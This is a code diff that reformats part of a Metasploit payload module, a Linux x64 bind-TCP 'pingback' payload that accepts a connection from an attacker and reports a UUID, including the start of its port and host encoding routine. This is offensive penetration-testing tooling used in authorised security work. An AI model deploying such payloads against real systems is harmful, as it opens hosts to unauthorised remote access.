@@ -3,10 +3,7 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
-
 module MetasploitModule
-
   CachedSize = 109
 
   include Msf::Payload::Linux
@@ -15,20 +12,23 @@ module MetasploitModule
   include Msf::Payload::Pingback::Options
 
   def initialize(info = {})
-    super(merge_info(info,
-      'Name'          => 'Linux x64 Pingback, Bind TCP Inline',
-      'Description'   => 'Accept a connection from attacker and report UUID (Linux x64)',
-      'Author'        => [ 'bwatters-r7' ],
-      'License'       => MSF_LICENSE,
-      'Platform'      => 'linux',
-      'Arch'          => ARCH_X64,
-      'Handler'       => Msf::Handler::BindTcp,
-      'Session'       => Msf::Sessions::Pingback
-    ))
+    super(
+      merge_info(
+        info,
+        'Name' => 'Linux x64 Pingback, Bind TCP Inline',
+        'Description' => 'Accept a connection from attacker and report UUID (Linux x64)',
+        'Author' => [ 'bwatters-r7' ],
+        'License' => MSF_LICENSE,
+        'Platform' => 'linux',
+        'Arch' => ARCH_X64,
+        'Handler' => Msf::Handler::BindTcp,
+        'Session' => Msf::Sessions::Pingback
+      )
+    )
     def generate_stage
       # 22 -> "0x00,0x16"
       # 4444 -> "0x11,0x5c"
-      encoded_port = [datastore['LPORT'].to_i,2].pack("vn").unpack("N").first
+      encoded_port = [datastore['LPORT'].to_i, 2].pack("vn").unpack("N").first
       encoded_host = Rex::Socket.addr_aton("0.0.0.0").unpack("V").first
       encoded_host_port = "0x%.8x%.8x" % [encoded_host, encoded_port]
       self.pingback_uuid ||= self.generate_pingback_uuid
